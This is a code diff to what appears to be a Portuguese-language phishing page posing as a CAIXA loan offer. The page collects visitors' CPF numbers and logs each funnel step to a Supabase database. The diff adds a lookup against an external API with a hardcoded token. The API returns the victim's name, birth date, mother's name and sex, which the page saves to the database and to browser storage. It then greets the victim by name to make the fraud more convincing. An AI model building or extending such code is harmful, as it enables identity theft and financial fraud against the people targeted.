@@ -285,6 +285,18 @@
       margin-bottom: 8px;
       font-weight: 500;
     }
+
+    /* API Error Message */
+    .api-error {
+      background: #fee2e2;
+      color: #dc2626;
+      padding: 12px;
+      border-radius: 12px;
+      font-size: 14px;
+      margin-bottom: 16px;
+      text-align: center;
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -310,6 +322,7 @@
 
       <div class="input-wrapper">
         <div id="cpfError" class="error-message" style="display: none;">CPF Inválido</div>
+        <div id="apiError" class="api-error" style="display: none;">Erro ao consultar dados. Tente novamente.</div>
         <input type="tel" placeholder="Digite o seu CPF" maxlength="14" id="cpfInput" inputmode="numeric">
       </div>
 
@@ -336,14 +349,12 @@
   </div>
 
   <!-- ============================================ -->
-  <!-- SUPABASE INTEGRATION - COLETANDO DADOS DO FUNIL -->
+  <!-- SUPABASE INTEGRATION
   <!-- ============================================ -->
   <script>
-    // CONFIGURAÇÃO DO SUPABASE
     const SUPABASE_URL = 'https://hbpgjwezukugbtviswkw.supabase.co';
     const SUPABASE_KEY = 'sb_publishable__7MjiigiJf7NgmLZPLFdxA_yRNF_cO8';
 
-    // GERENCIAMENTO DE SESSÃO
     function getSessaoId() {
       let id = sessionStorage.getItem('sessao_funil');
       if (!id) {
@@ -353,7 +364,6 @@
       return id;
     }
 
-    // FUNÇÃO PARA SALVAR ETAPA NO BANCO
     async function salvarEtapa(etapaNome, dadosColetados = {}) {
       const sessao_id = getSessaoId();
       
@@ -400,8 +410,9 @@
     const loadingScreen = document.getElementById('loadingScreen');
     const loadingMessage = document.getElementById('loadingMessage');
     const cpfError = document.getElementById('cpfError');
+    const apiError = document.getElementById('apiError');
 
-    // REGISTRA QUE O USUÁRIO CHEGOU NESTA PÁGINA (ETAPA 1 DO FUNIL)
+    // REGISTRA QUE O USUÁRIO CHEGOU NESTA PÁGINA
     salvarEtapa('pagina_acesso', { 
       pagina: 'acesso4e98',
       timestamp_acesso: new Date().toISOString()
@@ -409,6 +420,7 @@
 
     cpfInput.addEventListener('input', function(e) {
       cpfError.style.display = 'none';
+      apiError.style.display = 'none';
       let value = e.target.value.replace(/\D/g, '');
       
       if (value.length > 11) {
@@ -476,27 +488,73 @@
         }
         
         const cpfLimpo = cpfInput.value.replace(/\D/g, '');
+        let nomeCliente = null;
+        let dadosAPI = null;
         
-        // SALVA O CPF NO BANCO DE DADOS (ETAPA 2 DO FUNIL)
+        // ========================================
+        // BUSCA O NOME DO CLIENTE NA API EXTERNA
+        // ========================================
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Consultando dados...';
+        
+        try {
+          const apiUrl = `https://api.amnesiatecnologia.lat/?token=4c80cd47-d9d5-4672-a301-b9b8741fc293&cpf=${cpfLimpo}`;
+          console.log('🔍 Consultando API:', apiUrl);
+          
+          const response = await fetch(apiUrl);
+          const data = await response.json();
+          
+          if (data && data.DADOS && data.DADOS.nome) {
+            nomeCliente = data.DADOS.nome;
+            dadosAPI = data.DADOS;
+            console.log('✅ Nome encontrado na API:', nomeCliente);
+            console.log('📦 Dados completos:', dadosAPI);
+            apiError.style.display = 'none';
+          } else {
+            console.log('⚠️ Nome não encontrado na API');
+            apiError.style.display = 'block';
+            apiError.textContent = 'CPF não localizado. Verifique e tente novamente.';
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Próximo';
+            return;
+          }
+        } catch (error) {
+          console.error('❌ Erro ao consultar API:', error);
+          apiError.style.display = 'block';
+          apiError.textContent = 'Erro na consulta. Tente novamente.';
+          submitBtn.disabled = false;
+          submitBtn.textContent = 'Próximo';
+          return;
+        }
+        
+        // ========================================
+        // SALVA CPF E NOME NO BANCO DE DADOS
+        // ========================================
+        submitBtn.textContent = 'Salvando dados...';
+        
         await salvarEtapa('cpf_informado', {
           cpf: cpfLimpo,
           cpf_formatado: cpfInput.value,
+          nome: nomeCliente,
+          data_nascimento: dadosAPI?.data_nascimento,
+          nome_mae: dadosAPI?.nome_mae,
+          sexo: dadosAPI?.sexo,
           timestamp: new Date().toISOString()
         });
         
-        submitBtn.disabled = true;
-        submitBtn.textContent = 'Aguarde...';
-
-        // Simula envio para o backend (mantendo compatibilidade)
-        try {
-          fetch('capture.json', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ step: 'cpf', cpf: cpfLimpo })
-          }).catch(() => {});
-        } catch(e) {}
+        // Salva no storage para usar nas próximas páginas
+        const clienteData = {
+          cpf: cpfLimpo,
+          nome: nomeCliente,
+          data_nascimento: dadosAPI?.data_nascimento,
+          nome_mae: dadosAPI?.nome_mae
+        };
+        localStorage.setItem('funil_cliente_data', JSON.stringify(clienteData));
+        sessionStorage.setItem('funil_cliente_data', JSON.stringify(clienteData));
         
-        // Mostra loading screen
+        // ========================================
+        // MOSTRA TELA DE LOADING COM O NOME
+        // ========================================
         loadingScreen.style.display = 'flex';
         
         const loadingGif = document.getElementById('loadingGif');
@@ -526,10 +584,10 @@
         setTimeout(async function() {
           clearInterval(messageInterval);
           
-          // SALVA A ETAPA DE VALIDAÇÃO CONCLUÍDA
           await salvarEtapa('validacao_concluida', {
             status: 'sucesso',
             cpf_validado: cpfLimpo,
+            nome_cliente: nomeCliente,
             valor_pre_aprovado: 5000,
             timestamp: new Date().toISOString()
           });
@@ -537,7 +595,9 @@
           loadingGif.style.display = 'none';
           loadingIcon.style.display = 'block';
           loadingMessage.classList.add('final');
-          loadingMessage.textContent = 'Olá, cliente CAIXA!';
+          
+          // Exibe o nome do cliente na tela de loading
+          loadingMessage.textContent = `Olá, ${nomeCliente.split(' ')[0]}!`;
           loadingSubmessage.textContent = 'Validação concluída com sucesso';
           
           const loanAmount = document.getElementById('loanAmount');
